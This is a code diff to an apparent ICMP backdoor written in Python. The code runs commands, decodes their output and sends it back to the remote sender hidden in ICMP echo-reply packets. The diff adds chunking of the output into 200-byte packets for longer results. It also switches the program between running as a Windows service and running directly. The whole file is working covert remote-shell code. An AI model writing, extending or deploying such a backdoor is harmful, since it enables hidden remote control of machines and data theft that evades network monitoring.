@@ -22,6 +22,12 @@ output = None
 error = None
 
 
+def split_string_by_bytes(input_string, byte_length):
+    utf8_bytes = input_string
+    byte_chunks = [utf8_bytes[i:i + byte_length] for i in range(0, len(utf8_bytes), byte_length)]
+    return byte_chunks
+
+
 def packet_callback(packet):
     global output
     global error
@@ -41,16 +47,19 @@ def packet_callback(packet):
         os.close(child_conn)
         process.communicate()
 
-        string_output = output.decode('cp866').strip()
-        string_error = error.decode('cp866').strip()
-        print(string_output)
-        print(string_error)
+        output = output.decode('cp866').strip()
+        error = error.decode('cp866').strip()
+        print(output)
+        print(error)
         if output == '':
             reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
             send(reply_packet, verbose=False)
         else:
+            data_list = split_string_by_bytes(output, 200)
+            data_list.append('\n')
+            reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
             reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
-            send(reply_packet, verbose=False)
+            send(reply_packets, verbose=False)
 
 
 def ish_listen():
@@ -205,10 +214,10 @@ class Service(win32serviceutil.ServiceFramework):
 
 
 if __name__ == '__main__':
-    # main()
-    if len(sys.argv) == 1:
-        servicemanager.Initialize()
-        servicemanager.PrepareToHostSingle(Service)
-        servicemanager.StartServiceCtrlDispatcher()
-    else:
-        win32serviceutil.HandleCommandLine(Service)
+    main()
+    #if len(sys.argv) == 1:
+    #    servicemanager.Initialize()
+    #    servicemanager.PrepareToHostSingle(Service)
+    #    servicemanager.StartServiceCtrlDispatcher()
+    #else:
+    #    win32serviceutil.HandleCommandLine(Service)
